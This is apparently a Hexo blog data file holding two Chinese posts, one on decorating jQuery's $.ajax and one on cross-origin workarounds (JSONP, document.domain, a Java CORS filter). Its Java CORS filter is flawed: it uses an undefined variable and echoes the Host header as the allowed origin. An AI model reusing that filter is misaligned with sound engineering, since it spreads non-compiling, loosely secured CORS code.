.then .always等方法的链式调用\n  return ajaxBackup.apply( $, arguments );\n}\n```","source":"_posts/jQuery-ajax-intercept.md","raw":"---\ntitle: jQuery的ajax方法拦截器\ncatalog: true\ndate: 2017-06-19 22:40:34\nsubtitle:\nheader-img: post/IMG_2440.JPG\nkeyword: jquery,ajax,拦截\ntags:\n- jquery\n- ajax\n---\n之前因为一些原因，担任过一段时间公司的前端开发面试官，面试了很多人，问过这样两个问题：\n> 如何侵入一个方法实现代理（或者叫钩子）？// 2017年10月15日修正，这里应该叫装饰器或者装饰者\n\n> 在不修改页面业务代码只修改一处代码的情况下，如何统一处理jQuery的ajax的response数据？\n\n其实上面两个问题本质是差不多的，不过不知道是表述不清楚，还是web前端这一块的人水平确实参差不齐，尽然没有一个让我觉得满意的答案，网上其实也有答案，不过很多都不严谨，导致ajax的默认行为遭到破坏，例如：\n```javascript\nvar ajaxBackup = $.ajax;\n$.ajax = function( opts ) {\n  // do sth.\n  ajaxBackup( opts );\n}\n```\n上面的方法在大多数情况下可以使用，但是这样写的人肯定不知道ajax方法可以有两个参数`$.ajax( url, options )`，这就到导致了这种写法传入的`options`丢失了。。。 还有一个更严重的问题是，`$.ajax`方法返回的是一个类Promise对象，上面的写法直接导致了返回值为undefined。\n所以我认为应该这样写才能保证ajax方法的默认行为得到保护：\n```javascript\nvar ajaxBackup = $.ajax;\n\n$.ajax = function( url, options ) {\n\n  if ( typeof url === \"object\" ) {\n    options = url;\n    url = undefined;\n  }\n\n  options = options || {};\n\n  var completeBackUp = options.complete,\n    successBackup = options.success,\n    errorBackup = options.error;\n  var urlBackup = url;\n  var optionBackup = $.extend( {}, options );\n\n  options.complete = function() {\n    // to do sth. after request is complete.\n\n    if ( $.isFunction( completeBackUp ) ) {\n      completeBackUp.apply( options.context, arguments );\n    }\n  }\n  options.success = function( data ) {\n    // to do sth. after request is successful.\n    // 这里相当于做了代理，请求成功回调执行前要做的事\n\n    // 这里则是对传入的success回调进行相应\n    if ( $.isFunction( successBackup ) ) {\n      successBackup.apply( options.context, arguments );\n    }\n  }\n  options.error = function() {\n    if ( $.isFunction( errorBackup ) ) {\n      errorBackup.apply( options.context, arguments );\n    }\n  }\n\n  // 返回原先的ajax执行结果，不影响.done .then .always等方法的链式调用\n  return ajaxBackup.apply( $, arguments );\n}\n```","slug":"jQuery-ajax-intercept","published":1,"updated":"2017-10-15T14:40:52.684Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjvl000bi4ucjpgru1dk","content":"<p>之前因为一些原因，担任过一段时间公司的前端开发面试官，面试了很多人，问过这样两个问题：</p>\n<blockquote>\n<p>如何侵入一个方法实现代理（或者叫钩子）？// 2017年10月15日修正，这里应该叫装饰器或者装饰者</p>\n</blockquote>\n<blockquote>\n<p>在不修改页面业务代码只修改一处代码的情况下，如何统一处理jQuery的ajax的response数据？</p>\n</blockquote>\n<p>其实上面两个问题本质是差不多的，不过不知道是表述不清楚，还是web前端这一块的人水平确实参差不齐，尽然没有一个让我觉得满意的答案，网上其实也有答案，不过很多都不严谨，导致ajax的默认行为遭到破坏，例如：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> ajaxBackup = $.ajax;</span><br><span class=\"line\">$.ajax = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> opts </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// do sth.</span></span><br><span class=\"line\">  ajaxBackup( opts );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面的方法在大多数情况下可以使用，但是这样写的人肯定不知道ajax方法可以有两个参数<code>$.ajax( url, options )</code>，这就到导致了这种写法传入的<code>options</code>丢失了。。。 还有一个更严重的问题是，<code>$.ajax</code>方法返回的是一个类Promise对象，上面的写法直接导致了返回值为undefined。<br>\n所以我认为应该这样写才能保证ajax方法的默认行为得到保护：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> ajaxBackup = $.ajax;</span><br><span class=\"line\"></span><br><span class=\"line\">$.ajax = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> url, options </span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"keyword\">typeof</span> url === <span class=\"string\">\"object\"</span> ) &#123;</span><br><span class=\"line\">    options = url;</span><br><span class=\"line\">    url = <span class=\"literal\">undefined</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  options = options || &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> completeBackUp = options.complete,</span><br><span class=\"line\">    successBackup = options.success,</span><br><span class=\"line\">    errorBackup = options.error;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> urlBackup = url;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> optionBackup = $.extend( &#123;&#125;, options );</span><br><span class=\"line\"></span><br><span class=\"line\">  options.complete = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// to do sth. after request is complete.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( $.isFunction( completeBackUp ) ) &#123;</span><br><span class=\"line\">      completeBackUp.apply( options.context, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  options.success = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// to do sth. after request is successful.</span></span><br><span class=\"line\">    <span class=\"comment\">// 这里相当于做了代理，请求成功回调执行前要做的事</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 这里则是对传入的success回调进行相应</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( $.isFunction( successBackup ) ) &#123;</span><br><span class=\"line\">      successBackup.apply( options.context, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  options.error = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( $.isFunction( errorBackup ) ) &#123;</span><br><span class=\"line\">      errorBackup.apply( options.context, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 返回原先的ajax执行结果，不影响.done .then .always等方法的链式调用</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> ajaxBackup.apply( $, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>之前因为一些原因，担任过一段时间公司的前端开发面试官，面试了很多人，问过这样两个问题：</p>\n<blockquote>\n<p>如何侵入一个方法实现代理（或者叫钩子）？// 2017年10月15日修正，这里应该叫装饰器或者装饰者</p>\n</blockquote>\n<blockquote>\n<p>在不修改页面业务代码只修改一处代码的情况下，如何统一处理jQuery的ajax的response数据？</p>\n</blockquote>\n<p>其实上面两个问题本质是差不多的，不过不知道是表述不清楚，还是web前端这一块的人水平确实参差不齐，尽然没有一个让我觉得满意的答案，网上其实也有答案，不过很多都不严谨，导致ajax的默认行为遭到破坏，例如：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> ajaxBackup = $.ajax;</span><br><span class=\"line\">$.ajax = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> opts </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// do sth.</span></span><br><span class=\"line\">  ajaxBackup( opts );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面的方法在大多数情况下可以使用，但是这样写的人肯定不知道ajax方法可以有两个参数<code>$.ajax( url, options )</code>，这就到导致了这种写法传入的<code>options</code>丢失了。。。 还有一个更严重的问题是，<code>$.ajax</code>方法返回的是一个类Promise对象，上面的写法直接导致了返回值为undefined。<br>\n所以我认为应该这样写才能保证ajax方法的默认行为得到保护：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> ajaxBackup = $.ajax;</span><br><span class=\"line\"></span><br><span class=\"line\">$.ajax = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> url, options </span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"keyword\">typeof</span> url === <span class=\"string\">\"object\"</span> ) &#123;</span><br><span class=\"line\">    options = url;</span><br><span class=\"line\">    url = <span class=\"literal\">undefined</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  options = options || &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> completeBackUp = options.complete,</span><br><span class=\"line\">    successBackup = options.success,</span><br><span class=\"line\">    errorBackup = options.error;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> urlBackup = url;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> optionBackup = $.extend( &#123;&#125;, options );</span><br><span class=\"line\"></span><br><span class=\"line\">  options.complete = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// to do sth. after request is complete.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( $.isFunction( completeBackUp ) ) &#123;</span><br><span class=\"line\">      completeBackUp.apply( options.context, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  options.success = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// to do sth. after request is successful.</span></span><br><span class=\"line\">    <span class=\"comment\">// 这里相当于做了代理，请求成功回调执行前要做的事</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 这里则是对传入的success回调进行相应</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( $.isFunction( successBackup ) ) &#123;</span><br><span class=\"line\">      successBackup.apply( options.context, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  options.error = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( $.isFunction( errorBackup ) ) &#123;</span><br><span class=\"line\">      errorBackup.apply( options.context, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 返回原先的ajax执行结果，不影响.done .then .always等方法的链式调用</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> ajaxBackup.apply( $, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"关于javscript的跨域问题的几种解决办法","catalog":true,"date":"2017-06-27T14:38:47.000Z","subtitle":null,"header-img":"post/IMG_24851.JPG","_content":"\t\t\t\n要说跨域，那得先来认识什么是跨域，以下内容摘自网络\n![跨域](20170627224652.jpg)\n\n总而言之就是浏览器厂商为了web安全，使得不同域名的网页之间，无法通信，在博主的web开发历程中，主要遇到的是以下几种跨域的情况。\n　　　\n* web api访问时\n* iframe与父页面或顶层页面之间资源访问时\n* 访问opener时\n\n\n一般解决跨域问题可以从两个维度来解决\n* web前端通过一些技巧来解决\n* 后端的服务器解决\n\n### 通过前端手段解决\n通过前端来解决跨域问题是有限制的，但是能在不动后端代码的前提下已经能解决大部分的跨域问题了\n#### 解决web api的访问限制\n这种情况不少，因为开发模式的问题（比如你接的前端私活，给你提供了接口挂在外网，但是没有给你后端的源码，你无法启动一个本地服务来开发），或者你使用的是别人的服务（如一些实时天气数据接口），都会遇到跨域问题。因为服务器一般情况下并不会相应一个非本域名下的请求，这也是出于安全的考虑。但是我们可以通过jsonp来解决这个问题。\n我们都知道script标签可以引用来自任何域名下的js脚本文件（不存在的网站除外，你懂的），于是我们就可以通过这个特性来实现跨域访问一些api\n比如有一个请求是这样的\n```text\nhttp://example.com/getData\n```\n\n而我们的线上环境是http://mydomain.com，如果我们直接用`XmlHttpRequest`构造方法去发起这个请求，浏览器必定会抛出跨域的错误从而无法达到我们的预期，但是如果我们以这样的方式去请求这个接口\n```html\n<script src=\"http://example.com/getData\"></script>\n\n```\n你会说，这样就行了？ 慢着，这只是第一步，jsonp是需要通过后端的配合才能完成的。后端在此时的输出应该是一个执行的函数，实参是你要拿到的数据比如php\n```php\n// 这里只是一个例子，可能浏览器端不会执\n// 因为浏览器可能认为这只是一个字符串，具体的还请使用各个语言的特性使其输出为一个对象\necho 'callback({\"data\": \"hello world!\"})';\n```\n当这个“资源文件”请求完成后，js引擎便会执行这段脚本，从全局环境寻找`callback`这个函数，于是如果你事先定义了这个函数，如：\n```javascript\nwindow.callback = function( data ) {\n  console.log( data );\n  // DO STH...\n}\n```\n控制台便会输出服务端返回的`data`，但是一般情况下不会这样去请求一个jsonp类型的接口，往往是动态生成一个script标签写入到页面响应后再移除，并且具体响应的函数通过参数的形式传到后台，比如\n```html\n<script src=\"http://example.com/getData?callback=yourcallback\"></script>\n\n```\n`yourcallback`就是你定义的相应函数。通过jsonp的方式访问跨域的api有很多弊端，比如\n\n* 只能发起get请求，无法post数据\n* 执行上下文只能是global(如果你要通过callback参数传递一串context我也无异议)\n\n这是通过前端的办法（其实也有后端的配合）解决跨域api访问的限制。\n\n#### 解决iframe与父页面或顶层页面的通信(opener同理)\niframe与父页面之间的通信只能是根域名完全相同才行，比如：\n* iframe.com和a.iframe.com\n* a.iframe.com和b.iframe.com\n* iframe.com和iframe.com:8080\n\n如果根域名不同是无法通过常规手段进行通信的比如：\n* a.com与b.com（包括二级三级域名）\n* 1.1.1.1与a.com\n\n要解决同根域名之间的跨域（如获取子/父页面的dom、属性、方法）其实很简单，只需要将它们的domain都设置成根域名就好了\n```javascript\n// a.iframe.com下面的脚本\ndocument.domain = 'iframe.com';\n// b.iframe.com下面的脚本（iframe或opener）\ndocument.domain = 'iframe.com';\n```\n这样，同根域名页面之间的跨域问题便解决了，可以自由操纵dom，自由读写属性和方法\n\n### 通过后端服务解决\n也许你只是想解决webapi的跨域问题又拒绝使用jsonp这种感觉有点‘low’的解决方案，这时候就轮到服务端代码登场了，通过修改响应头信息来告知浏览器这个请求是否是安全可靠的。\n我们知道http协议的请求头/应头都有一串键值对，`Origin`这个属性会在我们的请求头里，`Access-Control-Allow-Origin`这个属性可能会在我们的响应头里（因为在本域名请求下这个属性有没有都无所谓），这就是我们能成功实现跨域接口访问的关键。当服务器端在`ccess-Control-Allow-Origin`里包含了我们的`Origin`，那浏览器就发起真正的请求，接口就能正确相应，这里以java为例\n```java\n// 这里是过滤器里面的方法\n@Override  \npublic void doFilter(ServletRequest req, ServletResponse res,  \n  FilterChain chain) throws IOException, ServletException {  \n  HttpServletResponse response = (HttpServletResponse) res;  \n  // 请求是什么Host，就响应什么\n  response.setHeader(\"Access-Control-Allow-Origin\", request.getHeader(\"Host\"));  \n  response.setHeader(\"Access-Control-Allow-Methods\", \"POST, GET, OPTIONS, DELETE\");  \n  response.setHeader(\"Access-Control-Allow-Headers\", \"x-requested-with\");  \n  chain.doFilter(req, res);  \n}  \n```\n这里有两点要注意\n* 浏览器检测到这是个跨域的请求时，会先发起一个请求方法为\"options\"的请求，所以服务端还必须得允许OPTIONS的请求类型\n* jquery的ajax的请求头会有x-requested-with这样的字样，`response.setHeader(\"Access-Control-Allow-Headers\", \"x-requested-with\")`这段代码依然是告诉浏览器允许这个自定义请求头\n往往允许一个跨域请求还要满足以上两点才能成功，总结一下浏览器的跨域api请求流程：\n\n1. 检测到这是一个跨域的请求（请求url的host和当前页面host不一样）;\n2. 先发起一个method为OPTIONS的请求，如果服务器的响应信息`Access-Control-Allow-Origin`没有我们的host，或者不允许OPTIONS请求方法，或者不允许自定义请求头`x-requested-with`，请求停止，抛出错误。否则：\n3. 再发一起一个正常的xhr请求，此时才会响应我们的逻辑回调函数\n\n在浏览器的开发者工具 network一栏里筛选xhr类型的请求可以清楚的看到浏览器对同一个请求发起了两次，第一次是OPTION请求，没有带上任何参数，第二次就是常规的请求\n\n\n以上则是博主对一些常见的跨域问题的解决方法的简单介绍，如有错误欢迎通过下方邮件指出。\n","source":"_posts/cross-domain.md","raw":"---\ntitle: 关于javscript的跨域问题的几种解决办法\ncatalog: true\ndate: 2017-06-27 22:38:47\nsubtitle:\nheader-img: post/IMG_24851.JPG\ntags:\n- javascript\n- 跨域\n---\n\t\t\t\n要说跨域，那得先来认识什么是跨域，以下内容摘自网络\n![跨域](20170627224652.jpg)\n\n总而言之就是浏览器厂商为了web安全，使得不同域名的网页之间，无法通信，在博主的web开发历程中，主要遇到的是以下几种跨域的情况。\n　　　\n* web api访问时\n* iframe与父页面或顶层页面之间资源访问时\n* 访问opener时\n\n\n一般解决跨域问题可以从两个维度来解决\n* web前端通过一些技巧来解决\n* 后端的服务器解决\n\n### 通过前端手段解决\n通过前端来解决跨域问题是有限制的，但是能在不动后端代码的前提下已经能解决大部分的跨域问题了\n#### 解决web api的访问限制\n这种情况不少，因为开发模式的问题（比如你接的前端私活，给你提供了接口挂在外网，但是没有给你后端的源码，你无法启动一个本地服务来开发），或者你使用的是别人的服务（如一些实时天气数据接口），都会遇到跨域问题。因为服务器一般情况下并不会相应一个非本域名下的请求，这也是出于安全的考虑。但是我们可以通过jsonp来解决这个问题。\n我们都知道script标签可以引用来自任何域名下的js脚本文件（不存在的网站除外，你懂的），于是我们就可以通过这个特性来实现跨域访问一些api\n比如有一个请求是这样的\n```text\nhttp://example.com/getData\n```\n\n而我们的线上环境是http://mydomain.com，如果我们直接用`XmlHttpRequest`构造方法去发起这个请求，浏览器必定会抛出跨域的错误从而无法达到我们的预期，但是如果我们以这样的方式去请求这个接口\n```html\n<script src=\"http://example.com/getData\"></script>\n\n```\n你会说，这样就行了？ 慢着，这只是第一步，jsonp是需要通过后端的配合才能完成的。后端在此时的输出应该是一个执行的函数，实参是你要拿到的数据比如php\n```php\n// 这里只是一个例子，可能浏览器端不会执\n// 因为浏览器可能认为这只是一个字符串，具体的还请使用各个语言的特性使其输出为一个对象\necho 'callback({\"data\": \"hello world!\"})';\n```\n当这个“资源文件”请求完成后，js引擎便会执行这段脚本，从全局环境寻找`callback`这个函数，于是如果你事先定义了这个函数，如：\n```javascript\nwindow.callback = function( data ) {\n  console.log( data );\n  // DO STH...\n}\n```\n控制台便会输出服务端返回的`data`，但是一般情况下不会这样去请求一个jsonp类型的接口，往往是动态生成一个script标签写入到页面响应后再移除，并且具体响应的函数通过参数的形式传到后台，比如\n```html\n<script src=\"http://example.com/getData?callback=yourcallback\"></script>\n\n```\n`yourcallback`就是你定义的相应函数。通过jsonp的方式访问跨域的api有很多弊端，比如\n\n* 只能发起get请求，无法post数据\n* 执行上下文只能是global(如果你要通过callback参数传递一串context我也无异议)\n\n这是通过前端的办法（其实也有后端的配合）解决跨域api访问的限制。\n\n#### 解决iframe与父页面或顶层页面的通信(opener同理)\niframe与父页面之间的通信只能是根域名完全相同才行，比如：\n* iframe.com和a.iframe.com\n* a.iframe.com和b.iframe.com\n* iframe.com和iframe.com:8080\n\n如果根域名不同是无法通过常规手段进行通信的比如：\n* a.com与b.com（包括二级三级域名）\n* 1.1.1.1与a.com\n\n要解决同根域名之间的跨域（如获取子/父页面的dom、属性、方法）其实很简单，只需要将它们的domain都设置成根域名就好了\n```javascript\n// a.iframe.com下面的脚本\ndocument.domain = 'iframe.com';\n// b.iframe.com下面的脚本（iframe或opener）\ndocument.domain = 'iframe.com';\n```\n这样，同根域名页面之间的跨域问题便解决了，可以自由操纵dom，自由读写属性和方法\n\n### 通过后端服务解决\n也许你只是想解决webapi的跨域问题又拒绝使用jsonp这种感觉有点‘low’的解决方案，这时候就轮到服务端代码登场了，通过修改响应头信息来告知浏览器这个请求是否是安全可靠的。\n我们知道http协议的请求头/应头都有一串键值对，`Origin`这个属性会在我们的请求头里，`Access-Control-Allow-Origin`这个属性可能会在我们的响应头里（因为在本域名请求下这个属性有没有都无所谓），这就是我们能成功实现跨域接口访问的关键。当服务器端在`ccess-Control-Allow-Origin`里包含了我们的`Origin`，那浏览器就发起真正的请求，接口就能正确相应，这里以java为例\n```java\n// 这里是过滤器里面的方法\n@Override  \npublic void doFilter(ServletRequest req, ServletResponse res,  \n  FilterChain chain) throws IOException, ServletException {  \n  HttpServletResponse response = (HttpServletResponse) res;  \n  // 请求是什么Host，就响应什么\n  response.setHeader(\"Access-Control-Allow-Origin\", request.getHeader(\"Host\"));  \n  response.setHeader(\"Access-Control-Allow-Methods\", \"POST, GET, OPTIONS, DELETE\");  \n  response.setHeader(\"Access-Control-Allow-Headers\", \"x-requested-with\");  \n  chain.doFilter(req, res);  \n}  \n```\n这里有两点要注意\n* 浏览器检测到这是个跨域的请求时，会先发起一个请求方法为\"options\"的请求，所以服务端还必须得允许OPTIONS的请求类型\n* jquery的ajax的请求头会有x-requested-with这样的字样，`response.setHeader(\"Access-Control-Allow-Headers\", \"x-requested-with\")`这段代码依然是告诉浏览器允许这个自定义请求头\n往往允许一个跨域请求还要满足以上两点才能成功，总结一下浏览器的跨域api请求流程：\n\n1. 检测到这是一个跨域的请求（请求url的host和当前页面host不一样）;\n2. 先发起一个method为OPTIONS的请求，如果服务器的响应信息`Access-Control-Allow-Origin`没有我们的host，或者不允许OPTIONS请求方法，或者不允许自定义请求头`x-requested-with`，请求停止，抛出错误。否则：\n3. 再发一起一个正常的xhr请求，此时才会响应我们的逻辑回调函数\n\n在浏览器的开发者工具 network一栏里筛选xhr类型的请求可以清楚的看到浏览器对同一个请求发起了两次，第一次是OPTION请求，没有带上任何参数，第二次就是常规的请求\n\n\n以上则是博主对一些常见的跨域问题的解决方法的简单介绍，如有错误欢迎通过下方邮件指出。\n","slug":"cross-domain","published":1,"updated":"2017-08-17T01:21:56.949Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjvl000ci4ucf88z5496","content":"<p>要说跨域，那得先来认识什么是跨域，以下内容摘自网络<br>\n<img src=\"20170627224652.jpg\" alt=\"跨域\"></p>\n<p>总而言之就是浏览器厂商为了web安全，使得不同域名的网页之间，无法通信，在博主的web开发历程中，主要遇到的是以下几种跨域的情况。</p>\n<ul>\n<li>web api访问时</li>\n<li>iframe与父页面或顶层页面之间资源访问时</li>\n<li>访问opener时</li>\n</ul>\n<p>一般解决跨域问题可以从两个维度来解决</p>\n<ul>\n<li>web前端通过一些技巧来解决</li>\n<li>后端的服务器解决</li>\n</ul>\n<h3><span id=\"通过前端手段解决\">通过前端手段解决</span></h3>\n<p>通过前端来解决跨域问题是有限制的，但是能在不动后端代码的前提下已经能解决大部分的跨域问题了</p>\n<h4><span id=\"解决web-api的访问限制\">解决web api的访问限制</span></h4>\n<p>这种情况不少，因为开发模式的问题（比如你接的前端私活，给你提供了接口挂在外网，但是没有给你后端的源码，你无法启动一个本地服务来开发），或者你使用的是别人的服务（如一些实时天气数据接口），都会遇到跨域问题。因为服务器一般情况下并不会相应一个非本域名下的请求，这也是出于安全的考虑。但是我们可以通过jsonp来解决这个问题。<br>\n我们都知道script标签可以引用来自任何域名下的js脚本文件（不存在的网站除外，你懂的），于是我们就可以通过这个特性来实现跨域访问一些api<br>\n比如有一个请求是这样的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://example.com/getData</span><br></pre></td></tr></table></figure>\n<p>而我们的线上环境是http://mydomain.com，如果我们直接用<code>XmlHttpRequest</code>构造方法去发起这个请求，浏览器必定会抛出跨域的错误从而无法达到我们的预期，但是如果我们以这样的方式去请求这个接口</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://example.com/getData\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>你会说，这样就行了？ 慢着，这只是第一步，jsonp是需要通过后端的配合才能完成的。后端在此时的输出应该是一个执行的函数，实参是你要拿到的数据比如php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这里只是一个例子，可能浏览器端不会执</span></span><br><span class=\"line\"><span class=\"comment\">// 因为浏览器可能认为这只是一个字符串，具体的还请使用各个语言的特性使其输出为一个对象</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'callback(&#123;\"data\": \"hello world!\"&#125;)'</span>;</span><br></pre></td></tr></table></figure>\n<p>当这个“资源文件”请求完成后，js引擎便会执行这段脚本，从全局环境寻找<code>callback</code>这个函数，于是如果你事先定义了这个函数，如：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.callback = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log( data );</span><br><span class=\"line\">  <span class=\"comment\">// DO STH...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>控制台便会输出服务端返回的<code>data</code>，但是一般情况下不会这样去请求一个jsonp类型的接口，往往是动态生成一个script标签写入到页面响应后再移除，并且具体响应的函数通过参数的形式传到后台，比如</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://example.com/getData?callback=yourcallback\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span 